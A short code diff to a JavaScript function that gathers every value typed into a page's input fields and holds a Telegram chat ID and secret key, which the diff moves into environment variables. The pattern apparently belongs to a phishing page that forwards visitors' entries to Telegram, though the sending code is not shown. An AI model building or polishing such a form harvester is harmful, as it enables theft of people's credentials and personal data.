@@ -1,9 +1,11 @@
+require("dotenv").config();
+
 function gatherInfo() {
   const inputs = Array.from(document.getElementsByClassName("userInput"));
-  const SECRET_KEY = "key";
+  const SECRET_KEY = process.env.SECRET_KEY;
   const userInput = [];
   const id = Date.now().toString();
-  const TELEGRAM_CHAT_ID = "-1002209368311";
+  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
   inputs.forEach((input) => {
     const type = input.getAttribute("aria-placeholder") || input.placeholder;
     const value = input.value;
